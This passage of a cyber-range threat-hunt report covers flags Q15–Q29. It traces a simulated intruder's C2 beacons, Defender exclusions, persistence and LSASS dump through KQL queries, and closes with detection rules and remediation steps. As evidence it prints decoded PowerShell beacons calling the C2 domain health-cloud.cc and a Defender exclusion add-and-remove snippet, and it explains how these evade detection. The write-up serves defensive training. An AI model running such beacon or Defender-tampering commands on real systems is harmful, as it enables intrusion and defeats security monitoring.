**MITRE Reference:** [T1562.002](https://attack.mitre.org/techniques/T1562/002/)

</details>

---

<details>
<summary>🚩 <strong>Q15 — Tooling Healthcheck Loop</strong> — <code>T1036.005</code> — 🟠 High</summary>

### 🎯 Objective
Count how many `/healthcheck` executions fired from the masquerade binary during post-access activity.

### 📌 Finding
`PHTGHealthCloudSvc.exe` executed **22** `/healthcheck` loops across the session, each one running against a flag identifier (`/flag:FLAG-01` through `/flag:FLAG-22`). This loop pattern is consistent with a C2 implant beaconing to confirm it remains operational.

### 🔧 KQL Query Used
```kql
DeviceProcessEvents
| where DeviceName == "azwks-phtg-01"
| where TimeGenerated > datetime(2025-12-13T09:48:40Z)
| where ProcessCommandLine contains "/healthcheck"
| summarize count()
```

**MITRE Reference:** [T1036.005](https://attack.mitre.org/techniques/T1036/005/)

</details>

---

### Phase 04 — The Beacon Pair

<details>
<summary>🚩 <strong>Q16 — Encoded Beacon Endpoints</strong> — <code>T1071.001</code> — 🔴 Critical</summary>

### 🎯 Objective
Decode two Base64-encoded PowerShell beacons and identify the C2 endpoints contacted.

### 📌 Finding
Two encoded beacons fired via `-EncodedCommand`. After Base64 decoding using PowerShell (`[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(...))`):

**Beacon 1 (10:13 UTC):**
```powershell
Invoke-WebRequest -Uri "https://status.health-cloud.cc/api/checkin?flag=FLAG-09&device=azwks-phtg-01" -UseBasicParsing -TimeoutSec 5 | Out-Null
```

**Beacon 2 (10:13 UTC):**
```powershell
Invoke-WebRequest -Uri "https://status.health-cloud.cc/api/status?flag=FLAG-10&device=azwks-phtg-01" -UseBasicParsing -TimeoutSec 5 | Out-Null
```

Both contact the same parent domain `health-cloud.cc` — attacker-controlled C2 infrastructure named to mimic the victim organisation.

### 🔧 KQL Query Used
```kql
DeviceProcessEvents
| where DeviceName == "azwks-phtg-01"
| where TimeGenerated between (datetime(2025-12-13 09:48:40) .. datetime(2025-12-13 23:59:59))
| where ProcessCommandLine has_any ("-EncodedCommand", "-enc", "-ec")
| project TimeGenerated, ProcessCommandLine
| sort by TimeGenerated asc
```

**MITRE Reference:** [T1071.001](https://attack.mitre.org/techniques/T1071/001/)

</details>

---

<details>
<summary>🚩 <strong>Q17 — Two Beacons, Why?</strong> — <code>T1071.001</code> — 🟠 High</summary>

### 🎯 Objective
Explain the operational benefit of running two parallel C2 beacon channels.

### 📌 Finding
Running two channels in parallel provides **resilience** — if one channel is blocked or detected, the operator retains connectivity through the second — while splitting traffic across two endpoints **reduces each channel's individual volume**, making the pattern harder for defenders to distinguish from legitimate HTTPS traffic.

### 💡 Why It Matters
Single-channel C2 is easier to detect — high-volume, repetitive connection pattern to one endpoint is a clear signal. Two channels halve the observable volume per endpoint and ensure the operator is never fully cut off by a single firewall rule or domain block.

**MITRE Reference:** [T1071.001](https://attack.mitre.org/techniques/T1071/001/)

</details>

---

<details>
<summary>🚩 <strong>Q18 — Deployment Pattern Recognition</strong> — <code>T1105</code> — 🔴 Critical</summary>

### 🎯 Objective
Name the two-step deployment pattern observed at 10:12:16 and 10:12:17.

### 📌 Finding
One second apart: an outbound `Invoke-WebRequest` pulls a tool from C2 to disk (**Ingress Tool Transfer — T1105**), immediately followed by execution of the downloaded file. Download then execute — the operator's consistent deployment pattern throughout the session.

### 💡 Why It Matters
The one-second gap between download and execute is a behavioral signature — not a coincidence. All four tools (pwncrypt, eicar, portscan, exfiltratedata) follow this exact rhythm. A detection rule on file creation followed by immediate execution of the same file within 5 seconds would catch this pattern reliably.

**MITRE Reference:** [T1105](https://attack.mitre.org/techniques/T1105/)

</details>

---

### Phase 05 — Outbound Whispers

<details>
<summary>🚩 <strong>Q19 — Operator Outbound Domains</strong> — <code>T1071.001</code> — 🔴 Critical</summary>

### 🎯 Objective
List both domains the operator's PowerShell contacted during post-access activity in chronological order.

### 📌 Finding
1. `updates.health-cloud.cc` — contacted at 10:12 UTC for tool staging (Ingress Tool Transfer)
2. `status.health-cloud.cc` — contacted after for C2 beacon check-in and status reporting

Both share the `.cc` TLD and the `health-cloud` domain — a deliberate naming choice to mimic the victim organisation's healthcare context.

### 🔧 KQL Query Used
```kql
DeviceNetworkEvents
| where DeviceName == "azwks-phtg-01"
| where TimeGenerated between (datetime(2025-12-13 09:48:40) .. datetime(2025-12-13 23:59:59))
| where ActionType == "ConnectionSuccess"
| where InitiatingProcessFileName == "powershell.exe"
| where RemoteUrl !contains "microsoft.com" and RemoteUrl !contains "onedrive.com"
| project TimeGenerated, RemoteUrl, RemoteIP
| sort by TimeGenerated asc
```

**MITRE Reference:** [T1071.001](https://attack.mitre.org/techniques/T1071/001/)

</details>

---

<details>
<summary>🚩 <strong>Q20 — AMSI Probe Identification</strong> — <code>T1562.001</code> — 🟠 High</summary>

### 🎯 Objective
Identify the plain PowerShell script from the Bin directory and explain its operational purpose.

### 📌 Finding
`amsi_probe.ps1` was executed at 10:14 UTC from `C:\ProgramData\PHTG\HealthCloud\Bin\`. AMSI (Antimalware Scan Interface) is the Windows checkpoint between PowerShell and the antivirus engine — every script PowerShell runs is passed through AMSI for inspection before execution. This probe tests whether AMSI is active and what it will intercept, before the operator deploys destructive tools.

![[Screenshots/Probing for AMSI.png]]

### 💡 Why It Matters
Running AMSI probe before pwncrypt and the other tools is a deliberate sequencing decision — check the coast is clear before committing the heavy tools. If AMSI had been active and catching malicious scripts, the operator could have pivoted to a bypass technique rather than burning their payload.

### 🔧 KQL Query Used
```kql
DeviceProcessEvents
| where DeviceName == "azwks-phtg-01"
| where TimeGenerated between (datetime(2025-12-13 09:48:40) .. datetime(2025-12-13 23:59:59))
| where ProcessCommandLine contains "HealthCloud\\Bin"
| project TimeGenerated, ProcessCommandLine, InitiatingProcessCommandLine
| sort by TimeGenerated asc
```

**MITRE Reference:** [T1562.001](https://attack.mitre.org/techniques/T1562/001/)

</details>

---

<details>
<summary>🚩 <strong>Q21 — Lineage Break Pattern</strong> — <code>T1059.003</code> — 🟠 High</summary>

### 🎯 Objective
Identify the two cmd.exe invocations used as intermediaries and explain the lineage benefit.

### 📌 Finding
`cmd.exe` was used twice as an intermediary launcher during the operator session:

1. `"cmd.exe" /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\ProgramData\PHTG\HealthCloud\Bin\hc_lineage.ps1"`
2. `"cmd.exe" /c "C:\ProgramData\PHTG\HealthCloud\phtg_health_diag_update_FLAG-22.bat"`

Chaining payloads through `cmd.exe` breaks the visible process lineage — the child PowerShell process has `cmd.exe` as its parent rather than the original attacker script, making it harder to attribute the child process back to the operator's primary execution chain.

### 💡 Why It Matters
Process lineage is one of the primary ways EDR tools and analysts trace attacker activity. `powershell.exe → cmd.exe → powershell.exe` severs the visible parent-child relationship at the cmd.exe boundary. Detection rules keyed on PowerShell spawned by attacker scripts would miss the second-generation processes.

**MITRE Reference:** [T1059.003](https://attack.mitre.org/techniques/T1059/003/)

</details>

---

### Phase 06 — Doors Held Open

<details>
<summary>🚩 <strong>Q22 — Defender Tampering</strong> — <code>T1562.001</code> — 🔴 Critical</summary>

### 🎯 Objective
Identify the path and process exclusions the operator added to Windows Defender after persistence landed.

### 📌 Finding
Three Defender exclusions were written via `msmpeng.exe` (Defender's own API — bypassing PowerShell logging):

1. **Path exclusion:** `C:\Users\vmAdminUsername\Documents\PHTG` (written at 10:11)
2. **Path exclusion:** `C:\ProgramData\PHTG\HealthCloud\Cache` (written at 10:12) — primary staging directory
3. **Process exclusion:** `C:\ProgramData\PHTG\HealthCloud\PHTGHealthCloudSvc.exe` (written at 10:14) — LOLBin

![[Screenshots/Defender exclusion in registry.png]]

### 💡 Why It Matters
Defender exclusions ensure the operator's tools and staging directory are permanently ignored by the AV engine. Excluding the process means the LOLBin can dump LSASS, scan the network, and execute payloads without triggering any AV alert regardless of how the payload behaves.

### 🔧 KQL Query Used
```kql
DeviceRegistryEvents
| where DeviceName == "azwks-phtg-01"
| where TimeGenerated between (datetime(2025-12-13 09:48:40) .. datetime(2025-12-13 23:59:59))
| where RegistryKey contains "Defender\\Exclusions"
| where ActionType in ("RegistryValueSet", "RegistryValueDeleted")
| project TimeGenerated, ActionType, RegistryKey, RegistryValueName, RegistryValueData
| sort by TimeGenerated asc
```

**MITRE Reference:** [T1562.001](https://attack.mitre.org/techniques/T1562/001/)

</details>

---

<details>
<summary>🚩 <strong>Q23 — Defender Detection Outcome</strong> — <code>T1562.001</code> — 🟡 Medium</summary>

### 🎯 Objective
Assess whether Defender detected and blocked the PHTG HealthCloud.lnk persistence artefact.

### 📌 Finding
Defender generated two `AntivirusReport` events on the `.lnk` artefact. `WasExecutingWhileDetected` was `false` in both cases — Defender caught it as a static file on disk, not while running. The absence of a `WasRemediated` field confirms Defender logged the detection but took no action. The persistence artefact survived.

### 💡 Why It Matters
Detection without remediation is a critical gap — the threat was seen but not stopped. This is a common outcome when Defender exclusions are in place or when AV confidence thresholds are tuned too conservatively. The LNK file remained in the Startup folder, meaning the persistence mechanism was fully operational despite being detected.

**MITRE Reference:** [T1562.001](https://attack.mitre.org/techniques/T1562/001/)

</details>

---

<details>
<summary>🚩 <strong>Q24 — Temporary Defender Exclusion</strong> — <code>T1562.001</code> — 🔴 Critical</summary>

### 🎯 Objective
Identify the temporarily excluded path and explain the add-then-remove technique.

### 📌 Finding
Inside `_.ps1`, the operator used a single PowerShell command string to temporarily exclude `C:\Users\vmAdminUsername\Documents\PHTG`, execute the payload with `-Wait` to ensure completion, then immediately remove the exclusion — all in sequence:

```powershell
Add-MpPreference -ExclusionPath $ScriptDir;
Start-Process powershell.exe -ArgumentList "... -File $OutFile" -Wait;
Remove-MpPreference -ExclusionPath $ScriptDir
```

The exclusion existed for only seconds. No permanent trace remains.

### 💡 Why It Matters
Permanent exclusions are noisy — a defender reviewing Defender configuration would spot them. A temporary exclusion that self-removes leaves no artefact for a post-incident review to find. This technique specifically defeats any detection rule that looks for Defender exclusion persistence, while still protecting the payload during the brief window it needs.

**MITRE Reference:** [T1562.001](https://attack.mitre.org/techniques/T1562/001/)

</details>

---

<details>
<summary>🚩 <strong>Q25 — Startup Execution Validation</strong> — <code>T1547.001</code> — 🟠 High</summary>

### 🎯 Objective
Confirm how many times the HealthCloudTray.ps1 startup command executed.

### 📌 Finding
**2 executions** — both on 12/28/2025 at 04:32:02 and 04:32:06 UTC (four seconds apart). Each logon event triggers both the Run key and the Startup LNK simultaneously — confirming both persistence mechanisms are functional and pointing to the same payload.

### 💡 Why It Matters
Configured persistence that hasn't fired yet is still active persistence. The gap between 13 December (when planted) and 28 December (when first fired) means the threat was resident for **15 days** before the persistence payload executed.

**MITRE Reference:** [T1547.001](https://attack.mitre.org/techniques/T1547/001/)

</details>

---

### Phase 07 — Hands on the Vault


<details>
<summary>🚩 <strong>Q26 — Custom Event Log Source Purpose</strong> — <code>T1562.002</code> — 🟠 High</summary>

### 🎯 Objective
Explain what registering a custom Application Event Log source enables and why the operator wants it.

### 📌 Finding
Registering `PHTGHealthCloud` as an Application Event Log source enables the operator's tooling to write entries directly to the Windows Application Event Log as a trusted source, blending their activity among legitimate application log entries where it receives far less scrutiny from defenders focused on the Security Event Log.

### 💡 Why It Matters
The Security Event Log is where analysts look for attacker behaviour. The Application Event Log receives hundreds of routine entries from browsers, Office, services, and update agents. An attacker's entries written there look identical to legitimate software activity — hiding in plain sight at the log level, not just the process level.

**MITRE Reference:** [T1562.002](https://attack.mitre.org/techniques/T1562/002/)

</details>

---

<details>
<summary>🚩 <strong>Q27 — LSASS Access Anomaly</strong> — <code>T1003.001</code> — 🔴 Critical</summary>

### 🎯 Objective
Among 139 OpenProcessApiCall events targeting lsass.exe, identify the one that is not baseline.

### 📌 Finding
`powershell.exe` under `vmadminusername` opened a handle to LSASS — the only non-system, non-baseline process among all OpenProcessApiCall events on phtg-01.

| Process | Account | DesiredAccess | Verdict |
|---------|---------|--------------|---------|
| MsMpEng.exe | system | 5136 | Legitimate |
| WmiPrvSE.exe | network service | 5136 | Legitimate |
| SenseIR.exe | system | 94954 | Legitimate (MDE sensor) |
| **powershell.exe** | **vmadminusername** | **2047999** | ✅ **Attacker** |

![[Screenshots/Desired access.png]]

### 🔧 KQL Query Used
```kql
DeviceEvents
| where DeviceName == "azwks-phtg-01"
| where TimeGenerated between (datetime(2025-12-13 09:48:40) .. datetime(2025-12-13 23:59:59))
| where ActionType == "OpenProcessApiCall"
| project TimeGenerated, InitiatingProcessFileName, InitiatingProcessAccountName, AdditionalFields
| sort by TimeGenerated asc
```

**MITRE Reference:** [T1003.001](https://attack.mitre.org/techniques/T1003/001/)

</details>

---

<details>
<summary>🚩 <strong>Q28 — Access Right Escalation</strong> — <code>T1003.001</code> — 🔴 Critical</summary>

### 🎯 Objective
Decode both DesiredAccess values and explain the significance of the escalation between them.

### 📌 Finding
Two OpenProcessApiCall events fired one second apart against LSASS:

| Timestamp | DesiredAccess (decimal) | Hex | Meaning |
|-----------|------------------------|-----|---------|
| 10:14:37 | 5136 | 0x1410 | Limited — read process info and query token |
| 10:14:38 | **2047999** | **0x1FFFFF** | **PROCESS_ALL_ACCESS — full control** |

The escalation is significant because it reveals deliberate staged methodology — the operator probed with limited access first (checking LSASS was accessible without triggering alerts), confirmed success, then immediately escalated to full access for the dump. This is not a single impulsive action but a two-step confirmation pattern.

### 💡 Why It Matters
`0x1FFFFF` (PROCESS_ALL_ACCESS) is the highest possible access level for a process handle. Any process opening LSASS with this value should be treated as a credential dump attempt unless it is a known, signed security tool running from a system path.

**MITRE Reference:** [T1003.001](https://attack.mitre.org/techniques/T1003/001/)

</details>

---

<details>
<summary>🚩 <strong>Q29 — Credential Dump Confirmation</strong> — <code>T1003.001</code> — 🔴 Critical</summary>

### 🎯 Objective
Confirm the next ActionType after LSASS full-access handle — proving the dump actually occurred.

### 📌 Finding
`ReadProcessMemoryApiCall` fired at **10:17:36 UTC** from `powershell.exe` under `vmadminusername` — **1,883,128 bytes** (approximately 1.8MB) read from a process. LSASS on a live Windows system typically occupies 1.5–3MB. This confirms the credential dump was completed, not just attempted.

The full credential access chain:
```
10:14:37 → OpenProcessApiCall (DesiredAccess 5136 — probe)
10:14:38 → OpenProcessApiCall (DesiredAccess 2047999 — full access)
10:17:36 → ReadProcessMemoryApiCall (1,883,128 bytes — dump confirmed)
```

### 💡 Why It Matters
All active domain credentials — NTLM hashes, Kerberos tickets, and potentially cleartext passwords — were in LSASS memory at the time of the dump. Every account that authenticated on phtg-01 during the session must be treated as compromised.

### 🔧 KQL Query Used
```kql
DeviceEvents
| where DeviceName == "azwks-phtg-01"
| where TimeGenerated between (datetime(2025-12-13 09:48:40) .. datetime(2025-12-13 23:59:59))
| where ActionType == "ReadProcessMemoryApiCall"
| project TimeGenerated, InitiatingProcessFileName, InitiatingProcessAccountName, AdditionalFields
| sort by TimeGenerated asc
```

**MITRE Reference:** [T1003.001](https://attack.mitre.org/techniques/T1003/001/)

</details>

---

## 🚨 Detection Gaps & Recommendations

### 🕳️ Observed Gaps

| Gap | Impact | Recommended Fix |
|-----|--------|----------------|
| No alert on PowerShell `-WindowStyle Hidden` + `-ExecutionPolicy Bypass` combination | Critical | Create detection rule — both flags together in one command |
| Defender detected Startup LNK but did not remediate | Critical | Review AV confidence thresholds; enforce remediation on medium+ confidence |
| Defender exclusions written via API (msmpeng.exe) bypassed PowerShell logging | High | Alert on Defender registry key modifications in HKLM\...\Defender\Exclusions |
| LSASS opened with PROCESS_ALL_ACCESS by non-system process — no alert | Critical | Alert on OpenProcessApiCall to lsass.exe from any non-whitelisted process |
| cmd.exe used as intermediary breaks process lineage tracking | High | Enrich detection rules with grandparent process context, not just parent |
| Base64-encoded C2 endpoints not flagged in network telemetry | High | Deploy script block logging to decode and inspect encoded commands at runtime |

### ✅ Recommended Detection Rules

```
RULE 1 — Hidden PowerShell Execution
IF ProcessCommandLine contains "-WindowStyle Hidden"
AND ProcessCommandLine contains "-ExecutionPolicy Bypass"
THEN ALERT HIGH

RULE 2 — LSASS Full Access Handle
IF ActionType == "OpenProcessApiCall"
AND AdditionalFields contains "lsass"
AND DesiredAccess == 2047999 (0x1FFFFF)
AND InitiatingProcessFileName NOT IN (known_security_tools)
THEN ALERT CRITICAL

RULE 3 — Defender Exclusion Added
IF RegistryKey contains "Defender\Exclusions"
AND ActionType == "RegistryValueSet"
AND InitiatingProcessFileName != "MsMpEng.exe"
THEN ALERT HIGH

RULE 4 — Ingress Tool Transfer + Immediate Execution
IF ProcessCommandLine contains "Invoke-WebRequest" AND contains "-OutFile"
AND within 5 seconds: ProcessCommandLine contains the same filename
THEN ALERT HIGH

RULE 5 — Encoded PowerShell Beacon
IF ProcessCommandLine contains "-EncodedCommand"
AND InitiatingProcessAccountName != "SYSTEM"
AND NOT InitiatingProcessFolderPath contains "System32"
THEN ALERT MEDIUM — Decode and inspect payload

RULE 6 — ReadProcessMemoryApiCall from User Context
IF ActionType == "ReadProcessMemoryApiCall"
AND InitiatingProcessAccountName NOT IN ("system", "network service")
AND AdditionalFields.TotalBytesCopied > 500000
THEN ALERT CRITICAL
```

---

## 🛠️ Remediation & Containment Checklist

### 🔴 Immediate Actions (0–4 hours)

- [ ] Isolate azwks-phtg-01 and azwks-phtg-02 from network
- [ ] Reset vmadminusername password immediately
- [ ] Investigate and isolate 10.0.0.152 — source of lateral movement, likely compromised
- [ ] Block health-cloud.cc (all subdomains) at DNS and firewall
- [ ] Block 173.244.55.128 at perimeter firewall
- [ ] Delete PHTGHealthCloud event log source from registry
- [ ] Preserve forensic images before any remediation

### 🟠 Short Term (4–24 hours)

- [ ] Remove all attacker tools from phtg-01:
  - [ ] C:\ProgramData\PHTG\HealthCloud\ (entire directory)
  - [ ] C:\ProgramData\pwncrypt.ps1
  - [ ] C:\ProgramData\exfiltratedata.ps1
  - [ ] C:\ProgramData\portscan.ps1
  - [ ] C:\ProgramData\eicar.ps1
  - [ ] C:\ProgramData\7z2408-x64.exe
- [ ] Remove persistence mechanisms:
  - [ ] Run key: HKCU\...\CurrentVersion\Run — delete PHTGHealthCloudTray value
  - [ ] Startup folder: delete PHTG HealthCloud.lnk
  - [ ] Scheduled task: PHTG User Baseline Report
  - [ ] Edge extension: phtghealthcloudext
- [ ] Remove Defender exclusions:
  - [ ] C:\ProgramData\PHTG\HealthCloud\Cache
  - [ ] C:\Users\vmAdminUsername\Documents\PHTG
  - [ ] Process exclusion: PHTGHealthCloudSvc.exe
- [ ] Full credential reset for all accounts active on phtg-01 — LSASS dumped
- [ ] Notify legal and compliance — employee records exfiltrated

### 🔵 Long Term (1–4 weeks)

- [ ] Enable PowerShell Script Block Logging across the estate
- [ ] Deploy Credential Guard to protect LSASS memory
- [ ] Enable LSASS Protected Process Light (PPL)
- [ ] Implement application whitelisting — block unsigned scripts from ProgramData
- [ ] Enable Controlled Folder Access to prevent unauthorised encryption (pwncrypt)
- [ ] Conduct full audit of 10.0.0.152 and any other machines it contacted

---

## 🧾 Final Assessment

This intrusion represents a methodical, patient, and operationally disciplined threat actor. The operator's behaviour throughout the 14-hour session was deliberately calibrated to blend into legitimate administration — choosing folder names, service names, and event log sources that mirror the victim's own environment. The attacker probed for defences before committing tools, used temporary exclusions that self-clean, broke process lineage at cmd.exe boundaries, and encoded C2 endpoints to evade string detection. This is not opportunistic malware — it is a targeted operator working a specific environment with care.

The credential dump (1.8MB from LSASS) and employee data exfiltration, combined with pwncrypt staging, strongly indicate a double-extortion ransomware operation: pay to prevent publication of employee records AND pay to restore encrypted data. The threat is not confined to phtg-01 — the prior foothold on 10.0.0.152 remains unaddressed, and every credential active on phtg-01 during the session is compromised.

The forensic record is assessed as **complete**. MDE telemetry captured the full operator session with sufficient fidelity to reconstruct every action. Breach notification is required given the confirmed exfiltration of employee records.

### Evidence Quality Rating

| Evidence Type | Quality | Notes |
|--------------|---------|-------|
| Process execution logs | 🟢 High | DeviceProcessEvents — complete command lines |
| Network telemetry | 🟢 High | DeviceNetworkEvents — outbound connections logged |
| Registry activity | 🟢 High | DeviceRegistryEvents — persistence and exclusions captured |
| File activity | 🟢 High | DeviceFileEvents — staging directory reconstructed |
| Credential access | 🟢 High | DeviceEvents — OpenProcess and ReadProcessMemory confirmed |

---

## 📎 Analyst Notes

- Report structured for portfolio review and interview readiness
- All 29 flags completed — investigation phases 00–07
- Every KQL query documented and reproducible in LAW-Cyber-Range workspace
- Techniques mapped directly to MITRE ATT&CK throughout
- Attack chain visualised in `Hunt Timeline by Karoly.canvas` (Obsidian)
- This hunt covers post-intrusion only — initial access vector investigated separately in Hunt 03

### 📝 Lessons Learned

- MDE tables provide richer process context than raw Sysmon — `ProcessVersionInfoOriginalFileName` enables LOLBin detection that Sysmon doesn't expose natively
- Shared cyber range environments require device scoping on every query — failure to scope generates thousands of irrelevant results from other participants
- Absence of evidence is valid evidence — Q03's negative finding (no onward pivot) was as important as positive findings
- Temporary Defender exclusions that self-remove require `DeviceEvents` PowerShellCommand logging to detect — registry events alone will miss them
- Base64 encoding is trivially reversible but still effective against string-based detection rules — decode all `-EncodedCommand` parameters as standard hunting practice

---

*Report by: Károly Mathe | Log(n) Pacific Internship | 2025-12-13*
*Classification: TLP:AMBER — CONFIDENTIAL — Do not distribute without authorisation*
